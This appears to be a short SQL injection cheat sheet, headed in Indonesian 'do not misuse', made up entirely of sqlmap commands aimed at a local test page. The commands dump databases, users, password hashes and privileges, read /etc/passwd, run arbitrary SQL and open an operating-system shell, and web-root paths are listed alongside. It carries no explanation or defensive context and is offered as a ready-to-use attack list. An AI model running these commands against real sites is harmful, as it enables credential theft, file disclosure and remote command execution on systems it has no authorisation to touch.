<h1>Jangan Disalah Gunakan</h1>
command :
</br>
python ./sqlmap.py -u "http://localhost/weak.php?id=10" --dbs
</br>
python sqlmap.py -u "http://localhost/weak.php?id=10" -b
</br>
python sqlmap.py -u "http://localhost/weak.php?id=10" --users --passwords --privileges --roles --threads=10
</br>
python sqlmap.py -u "http://localhost/weak.php?id=10" --current-user --is-dba --current-db --hostname --threads=10
</br>
python sqlmap.py -u "http://localhost/weak.php?id=10" --file-read=/etc/passwd --threads=10
</br>
C:\xampp\htdocs
</br>
/var/www/html/
</br>
python sqlmap.py -u "http://localhost/weak.php?id=10" --sql-query="select now();"
</br>
python sqlmap.py -u "http://localhost/weak.php?id=10" --os-shell
